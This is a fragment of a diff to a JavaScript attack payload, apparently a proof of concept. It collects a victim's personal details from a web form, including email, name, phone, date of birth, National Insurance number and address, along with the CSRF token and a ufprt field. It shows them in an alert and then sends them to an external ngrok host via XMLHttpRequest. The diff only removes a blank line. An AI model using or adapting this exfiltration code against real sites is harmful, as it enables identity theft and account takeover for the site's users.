@@ -30,7 +30,6 @@ req1.onreadystatechange = function()
         var token = document.getElementsByTagName("input")['__RequestVerificationToken'].value;
         var ufprt = document.getElementsByTagName("input")['ufprt'].value;
         alert('victim_Email = ' + Email + ' \n' + 'victim_FirstName = ' + FirstName + '\n' + 'victim_SurName =' + SurName + '\n' + 'victim_ContactNo = ' + ContactNo + '\n' + 'victim_DateOfBirth = ' + DateOfBirth + '\n' + 'victim_NationalInsuranceNumber = ' + NationalInsuranceNumber + '\n' + 'victim_FirstLineAddress = ' + FirstLineAddress + '\n' + 'victim_SecondLineAddress = ' + SecondLineAddress + '\n' + 'victim_Town = ' + Town + '\n'+ 'victim_Country = ' + Country + '\n' + 'victim_postCode = ' + postCode + '\n' + 'Csrf_Token = ' + token + '\n' + 'ufprt_value = ' + ufprt);
-        
         var stealInfo = new XMLHttpRequest();
         stealInfo.open('post', 'https://e493dd9163a3.ngrok.io', true);
         stealInfo.send('Email='+Email+'&FirstName='+FirstName+'&SurName='+SurName+'&ContactNo='+ContactNo+'&DateOfBirth='+DateOfBirth+'&NationalInsuranceNumber='+NationalInsuranceNumber+'&FirstLineAddress='+FirstLineAddress+'&SecondLineAddress='+SecondLineAddress+'&Town='+Town+'&Country='+Country+'&postCode='+postCode+'&__RequestVerificationToken='+token+'&ufprt='+ufprt+'')
